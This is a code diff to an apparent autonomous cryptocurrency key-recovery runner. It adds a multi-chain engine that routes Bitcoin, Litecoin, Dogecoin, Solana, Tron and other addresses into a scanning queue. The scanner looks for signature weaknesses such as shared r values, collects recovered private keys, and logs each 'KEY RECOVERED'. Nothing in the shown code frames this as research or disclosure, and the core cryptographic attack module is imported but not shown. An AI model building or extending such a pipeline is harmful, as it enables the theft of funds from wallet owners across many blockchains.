@@ -51,8 +51,11 @@ import {
   drainE1TargetedAddresses,
   drainSpiderUrls,
   drainCrossNonceCandidates,
+  drainMultiChainAddresses,
   poolSummary,
 } from "./cross-engine-pool";
+import { scanAddress as multiChainScanAddress } from "./multi-chain-engine";
+import { detectChain } from "./chain-adapter";
 
 // ── Paths ─────────────────────────────────────────────────────────────────────
 
@@ -123,14 +126,16 @@ export interface AutonomousStatus {
   statusMessage:        string;
   estimatedBlocksPerHour: number;
   progressPct:          number;
+  seededWallets:        number;
   crossEngineFlows:     AutonomousState["crossEngineFlows"];
   poolStats: {
-    osintQueue:    number;
-    peelQueue:     number;
-    e1Queue:       number;
-    urlQueue:      number;
-    rValues:       number;
-    confirmedKeys: number;
+    osintQueue:      number;
+    peelQueue:       number;
+    e1Queue:         number;
+    multiChainQueue: number;
+    urlQueue:        number;
+    rValues:         number;
+    confirmedKeys:   number;
   };
 }
 
@@ -252,9 +257,9 @@ export function getAutonomousStatus(): AutonomousStatus {
       lastBlockScanned: 0, lowestBlockCovered: 0, blocksRemaining: 0,
       osintRuns: 0, peelRuns: 0, hybridRuns: 0, errors: 0,
       pendingUrls: 0, statusMessage: "Not started",
-      estimatedBlocksPerHour: 0, progressPct: 0,
+      estimatedBlocksPerHour: 0, progressPct: 0, seededWallets: 0,
       crossEngineFlows: emptyFlows,
-      poolStats: { osintQueue: 0, peelQueue: 0, e1Queue: 0, urlQueue: 0, rValues: 0, confirmedKeys: 0 },
+      poolStats: { osintQueue: 0, peelQueue: 0, e1Queue: 0, multiChainQueue: 0, urlQueue: 0, rValues: 0, confirmedKeys: 0 },
     };
   }
 
@@ -289,12 +294,13 @@ export function getAutonomousStatus(): AutonomousStatus {
     seededWallets:         _seededWallets,
     crossEngineFlows:      _state.crossEngineFlows,
     poolStats: {
-      osintQueue:    pool.pendingOsintAddresses.size,
-      peelQueue:     pool.pendingPeelAddresses.size,
-      e1Queue:       pool.pendingE1TargetedAddresses.size,
-      urlQueue:      pool.pendingSpiderUrls.length,
-      rValues:       pool.rValueSigs.size,
-      confirmedKeys: pool.confirmedPrivateKeys.size,
+      osintQueue:      pool.pendingOsintAddresses.size,
+      peelQueue:       pool.pendingPeelAddresses.size,
+      e1Queue:         pool.pendingE1TargetedAddresses.size,
+      multiChainQueue: pool.pendingMultiChainAddresses.size,
+      urlQueue:        pool.pendingSpiderUrls.length,
+      rValues:         pool.rValueSigs.size,
+      confirmedKeys:   pool.confirmedPrivateKeys.size,
     },
   };
 }
@@ -364,14 +370,20 @@ async function seedPoolFromDatabase(pool: ReturnType<typeof getCrossEnginePool>)
     return 0;
   }
 
-  // Feed every collected address into all three relevant engine queues
+  // Detect chain and route each address to the right engine queue
   let injected = 0;
   for (const addr of addrs) {
-    // Skip null address and common burn addresses
     if (addr === "0x0000000000000000000000000000000000000000") continue;
-    pool.pendingE1TargetedAddresses.add(addr);
-    pool.pendingOsintAddresses.add(addr);
-    pool.pendingPeelAddresses.add(addr);
+    const chain = detectChain(addr);
+    if (chain === "ethereum" || chain === "unknown") {
+      // EVM address (or unknown — treat as ETH) → existing three queues
+      pool.pendingE1TargetedAddresses.add(addr);
+      pool.pendingOsintAddresses.add(addr);
+      pool.pendingPeelAddresses.add(addr);
+    } else {
+      // Non-EVM address (BTC, LTC, DOGE, SOL, TRX, etc.) → multi-chain engine queue
+      pool.pendingMultiChainAddresses.set(addr, chain);
+    }
     injected++;
   }
 
@@ -790,6 +802,47 @@ export async function startAutonomousRunner(opts: {
         for (const addr of c.addresses) {
           pool.pendingPeelAddresses.add(addr);
           pool.pendingE1TargetedAddresses.add(addr);
+        }
+      }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    // MULTI-CHAIN ENGINE: Bitcoin / Litecoin / Dogecoin / Solana / Tron / etc.
+    // Drains up to 5 non-EVM addresses per window from the pool and scans each
+    // on its native blockchain. Results feed back into the ETH pool as findings.
+    // ══════════════════════════════════════════════════════════════════════════
+    const mcBatch = drainMultiChainAddresses(pool, 5);
+    if (mcBatch.length > 0) {
+      state.statusMessage = `Multi-chain: scanning ${mcBatch.length} non-EVM address(es)`;
+      log(`Multi-chain engine: processing ${mcBatch.length} address(es) [${mcBatch.map(([a,c]) => `${c}:${a.slice(0,8)}…`).join(", ")}]`);
+      for (const [addr] of mcBatch) {
+        if (_stopRequested) break;
+        try {
+          const result = await multiChainScanAddress(addr, { maxTx: 60 });
+          for (const f of result.findings) {
+            findings.push({
+              engine:     `multi_chain_${result.chain}`,
+              kind:       f.attackType,
+              address:    f.address,
+              privateKey: f.recoveredPrivKey,
+              value:      f.sharedR || f.attackType,
+              detail:     f.detail,
+              url:        undefined,
+              txHash:     f.txHash1,
+              confidence: f.confidence,
+              discoveredAt: f.discoveredAt,
+            });
+            if (f.recoveredPrivKey && !state.recoveredKeys.includes(f.recoveredPrivKey)) {
+              state.recoveredKeys.push(f.recoveredPrivKey);
+              log(`🔑 KEY RECOVERED on ${result.chainName}: ${addr} → ${f.recoveredPrivKey.slice(0, 16)}…`);
+            }
+          }
+          if (result.sigsFound > 0) {
+            log(`Multi-chain ${result.chainName}: ${result.sigsFound} sigs, ${result.findings.length} finding(s) for ${addr}`);
+          }
+        } catch (e) {
+          log(`Multi-chain error for ${addr}: ${e}`);
+          state.errors++;
         }
       }
     }
